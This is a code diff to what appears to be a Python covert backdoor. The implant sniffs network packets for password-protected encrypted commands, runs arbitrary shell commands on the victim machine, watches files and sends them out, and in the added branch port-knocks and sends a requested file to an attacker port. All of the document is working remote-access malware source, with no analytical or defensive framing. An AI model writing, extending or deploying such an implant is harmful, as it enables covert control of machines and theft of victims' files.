@@ -18,6 +18,8 @@ class WatchHandler(FileSystemEventHandler):
             utils.send_file(WATCH_FILE)
 
 def sniff_callback(packet):
+    global WATCH_FILE
+    global observer
     if packet.haslayer(Raw):
         payload = decrypt(packet['Raw'].load)
         password_length = len(PASSWORD)
@@ -25,14 +27,12 @@ def sniff_callback(packet):
         if payload[0:password_length] != PASSWORD:
             return
 
-        watch_file = int(payload[password_length])
+        flag = int(payload[password_length])
 
         command = payload[password_length + 1:len(payload)]
         empty_packet = IP(dst=packet[IP].src) / UDP(sport=VICTIM_PORT, dport=ATTACKER_PORT)
 
-        if watch_file:
-            global WATCH_FILE
-            global observer
+        if flag == 1:
             observer.stop()
             observer = Observer()
             WATCH_FILE = command
@@ -40,7 +40,11 @@ def sniff_callback(packet):
             path = os.path.split(WATCH_FILE)[0]
             observer.schedule(event_handler, path, recursive=False)
             observer.start()
-        else:
+        elif flag == 2:
+            utils.knock()
+            sleep(1)
+            utils.send_file(command)
+        elif flag == 0:
             proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
             output = proc.stdout.read() + "\n" + proc.stderr.read()
 
